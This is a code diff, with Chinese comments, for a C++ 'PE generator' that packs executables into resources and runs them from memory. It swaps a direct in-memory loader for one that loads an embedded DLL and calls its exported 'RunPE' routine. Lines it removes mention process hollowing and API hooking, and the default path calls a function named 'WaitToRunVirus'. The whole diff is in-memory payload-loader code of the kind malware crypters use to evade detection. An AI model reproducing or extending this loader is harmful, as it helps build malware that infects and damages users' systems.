@@ -8,15 +8,16 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
-#include <DbgHelp.h>
 
 #include <atlstr.h>
 
-#pragma comment(lib, "Dbghelp.lib")
+// 原函数指针
+typedef HRSRC(WINAPI* FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
+typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE hModule, HRSRC hResInfo);
 
 extern HMEMORYMODULE g_mem_pe;
-extern FARPROC OriginalFindResource;
-extern FARPROC OriginalLoadResource;
+extern FindResource_t OriginalFindResource;
+extern LoadResource_t OriginalLoadResource;
 
 BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
 BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
@@ -29,10 +30,10 @@ BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LO
 BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
 BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);
 
-// 用于 Process Hollowing 的辅助线程函数
-DWORD WINAPI HollowingThread(LPVOID lpParam);
-HMODULE WINAPI CustomFindResource(HMODULE hModule, LPCTSTR lpName, LPCTSTR lpType);
-HGLOBAL WINAPI CustomLoadResource(HMODULE hModule, HRSRC hResInfo);
+
+// 定义一个函数指针类型，与 DLL 中的导出函数签名匹配
+typedef int (*RunPEFunc)(int);
+// typedef int (*RunPEFunc)(void*, DWORD);
 
 // 将资源添加到新文件的结构体
 struct ResourceUpdateData {
@@ -43,27 +44,44 @@ struct ResourceUpdateData32 {
     HANDLE hUpdate;
 };
 
+// 自定义结构体，模仿 IMAGE_RESOURCE_DATA_ENTRY
+typedef struct {
+    DWORD OffsetToData;  // 资源数据的偏移
+    DWORD Size;          // 资源数据的大小
+} RESOURCE_ENTRY, * PRESOURCE_ENTRY;
+
 class CPEGenerator
 {
 public:
-	CPEGenerator() {
+	CPEGenerator()
+        : ph(NULL)
+        , pRunPE(NULL)
+    {
 
 	}
 	~CPEGenerator() {
+
+        if (ph) {
+            MemoryFreeLibrary(ph);
+        }
 
 	}
 
 public:
     void ParseParams(int argc, wchar_t* argv[]) {
         if (argc <= 1) {
-            // WaitToRunVirus();
-            MemoryLoadToRun(IDR_BINARY_FILE);
+            WaitToRunVirus();
+            // MemoryLoadToRun(IDR_BINARY_FILE);
+            // MemoryLoadToRun(IDR_BINARY_FILE);
+            //pRunPE(IDR_BINARY_FILE);
         }
         else if (argc == 2) {
             CString str_param = argv[1];
             if (str_param == L"run") {
                 // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
-                MemoryLoadToRun(IDR_BINARY_FILE);
+                // MemoryLoadToRun(IDR_BINARY_FILE);
+                MemLoadDll();
+                pRunPE(IDR_BINARY_FILE);
                 // RunPE();
 
                 //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
@@ -255,10 +273,61 @@ public:
         return TRUE;
     }
 
+    BOOL MemLoadDll() {
+        BOOL flag = FALSE;
+        try {
+            // 加载当前模块
+            HMODULE hModule = GetModuleHandle(NULL);
+            if (!hModule) {
+                std::wcerr << L"Failed to load module.\n";
+                return flag;
+            }
+
+            // 查找资源
+            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_PH), RT_RCDATA);
+            if (!hResource) {
+                std::wcerr << L"Failed to find resource.\n";
+                return flag;
+            }
+
+            // 加载资源
+            HGLOBAL hResData = LoadResource(hModule, hResource);
+            if (!hResData) {
+                std::wcerr << L"Failed to load resource.\n";
+                return flag;
+            }
+
+            // 获取资源大小和数据指针
+            DWORD dataSize = SizeofResource(hModule, hResource);
+            void* pData = LockResource(hResData);
+
+            // 2. 使用 MemoryLoadLibrary 将 EXE 加载到内存
+            ph = MemoryLoadLibrary(pData, dataSize);
+
+            if (!ph) {
+                std::cout << "Failed to load EXE into memory." << std::endl;
+                return flag;
+            }
+
+            pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");
+
+            //// 假设已加载 DLL，得到其句柄
+            //HMODULE hDll = LoadLibraryA("PhDll.dll");
+
+            //MessageBox(NULL, L"test", L"test", MB_OK);
+            //// 使用 GetProcAddress 获取 RunPE 函数的地址
+            //RunPEFunc pRunPE = (RunPEFunc)GetProcAddress(hDll, "RunPE");
+
+            // pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");
+        }
+        catch (const std::exception& e) {
+            std::cout << "Error: " << e.what() << std::endl;
+            return flag;
+        }
+        return flag;
+    }
+
     BOOL MemoryLoadToRun(int resourceId) {
-
-        MessageBox(NULL, L"test", L"test", MB_OK);
-
         BOOL flag = FALSE;
         try {
             // 加载当前模块
@@ -286,46 +355,32 @@ public:
             DWORD dataSize = SizeofResource(hModule, hResource);
             void* pData = LockResource(hResData);
 
+            // pRunPE(pData, dataSize);
+
             // 2. 使用 MemoryLoadLibrary 将 EXE 加载到内存
-            HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
+            /*HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
             if (!hmemModule) {
                 std::cout << "Failed to load EXE into memory." << std::endl;
                 return flag;
-            }
-
-            g_mem_pe = hmemModule;
-            // 获取原始 API 的地址
-#ifdef _WIN64
-            OriginalFindResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindResourceA");
-            OriginalLoadResource = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadResource");
-#else
-            OriginalFindResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "FindResourceA");
-            OriginalLoadResource = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadResource");
-#endif
-
-            // Hook API 函数
-            HookAPIFunction("kernel32.dll", "FindResourceA", (FARPROC)CustomFindResource, &OriginalFindResource);
-            HookAPIFunction("kernel32.dll", "LoadResource", (FARPROC)CustomLoadResource, &OriginalLoadResource);
-
-            
+            }*/
 
             // 获取当前进程的资源目录地址
-            IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
-            if (currentResourceDir) {
-                // 重定向内存加载 EXE 的资源目录指针
-                RedirectResourceDirectory(hmemModule, currentResourceDir);
-            }
-            else {
-                std::cerr << "Failed to locate current process resource directory." << std::endl;
-            }
+            //IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
+            //if (currentResourceDir) {
+            //    // 重定向内存加载 EXE 的资源目录指针
+            //    RedirectResourceDirectory(hmemModule, currentResourceDir);
+            //}
+            //else {
+            //    std::cerr << "Failed to locate current process resource directory." << std::endl;
+            //}
             
             
 
             // 3. 获取 EXE 文件的入口点并调用
-            MemoryCallEntryPoint(hmemModule);
+            // MemoryCallEntryPoint(hmemModule);
 
             // 4. 卸载 EXE 文件
-            MemoryFreeLibrary(hmemModule);
+            // MemoryFreeLibrary(hmemModule);
         }
         catch (const std::exception& e) {
             std::cout << "Error: " << e.what() << std::endl;
@@ -405,7 +460,7 @@ public:
 
 
 private:
-
-
+    RunPEFunc pRunPE;
+    HMEMORYMODULE ph;
 
 };
